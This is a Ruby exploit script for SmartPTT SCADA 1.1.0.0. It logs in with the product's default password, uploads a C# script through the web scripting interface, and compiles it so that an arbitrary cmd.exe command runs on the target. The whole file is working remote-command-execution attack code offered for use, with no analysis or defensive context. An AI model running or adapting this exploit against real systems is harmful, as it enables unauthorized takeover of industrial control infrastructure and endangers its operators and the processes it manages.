#!/usr/bin/env ruby -W0 
# SmartPTT SCADA 1.1.0.0 / ioServer.exe
# Uploads some C# code and executes it via the scripting api.
require 'rex'
require 'rex/mime'

host = ARGV[0]
cmd  = ARGV[1] || 'calc.exe'

def usage
 puts "[*] #{$0} <host> [cmd]"
 exit
end

usage if ARGV.size < 1

begin

script = %Q|
using System;
using System.Diagnostics;

namespace CustomScript
{
    public class CustomScript
    {
        static CustomScript()
       {
            using (Process hax = new Process())
                {
                    hax.StartInfo.UseShellExecute = true;
                    hax.StartInfo.FileName = "cmd.exe";
                    hax.StartInfo.Arguments = "/c #{cmd}";
                    hax.Start();
                }
        }
    }
} 
|

sock = Rex::Proto::Http::Client.new(host, 
                                    port = 8101, 
                                    context = {}, 
                                    ssl = false)

req = sock.request_cgi(
 {
  'uri'   => '/auth.html',
  'method' => 'POST',
  'vars_post'=> {
   'auth_password' => 'elcomplus' # default login
   },
  })
sock.send_request(req)
data = sock.read_response()
 if data.get_cookies.include?('auth_code')
  puts "[*] Authenticated.."
  cookie = data.get_cookies
  name   = Rex::Text.rand_text_alpha(5) + '.cs'
  addfile = "FileName=#{name}&script_add=Add+Script"
  req = sock.request_cgi(
   {
    'uri'   => '/scripts.html',
    'method' => 'POST',
    'cookie' => cookie,
    'data'   => addfile,
   })
  sock.send_request(req)
  data = sock.read_response()
  if data.get_cookies.include?('auth_code')
  puts "[*] Retrieving GUID..."
    req = sock.request_raw(
    {
     'uri' => "/scripts.html",
     'cookie' => cookie,
    })
   sock.send_request(req)
   data = sock.read_response()
   if data.body.include?(name)
    guids = []
       guids << data.body.scan(/script_guid=(\w+)/).uniq
   end
    guids.each do |x|
	@guid = guids.last
    end
    puts "[*] Got guid: " + @guid.last[0]
    post_data = Rex::MIME::Message.new
    post_data.add_part('', nil, nil, "form-data; name=\"script_code_save\"")
    post_data.add_part(@guid.last[0], nil, nil, "form-data; name=\"script_guid\"")
    post_data.add_part(script, nil, nil, "form-data; name=\"script_code\"")
    req = sock.request_cgi(
    {
     'uri'   => '/script_edit.html',
     'method' => 'POST',
     'cookie' => cookie,
     'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
     'data'    => post_data.to_s,
    })
    sock.send_request(req)
    data = sock.read_response()
   if data.code == 302
   req = sock.request_cgi(
    {
     'uri' => "/script_edit.html",
     'method' => 'POST',
     'cookie' => cookie,
     'vars_post' => {
       'action' => 'script_compile',
       'script_guid' => @guid.last[0],
      },
    })
   puts "[*] Executing #{name} with command '#{cmd}'..."
   sock.send_request(req)
   data = sock.read_response()
  end
 end
 else
  puts '[!] Invalid password...'
 end
rescue => e
puts "[!] #{e.to_s}"
end
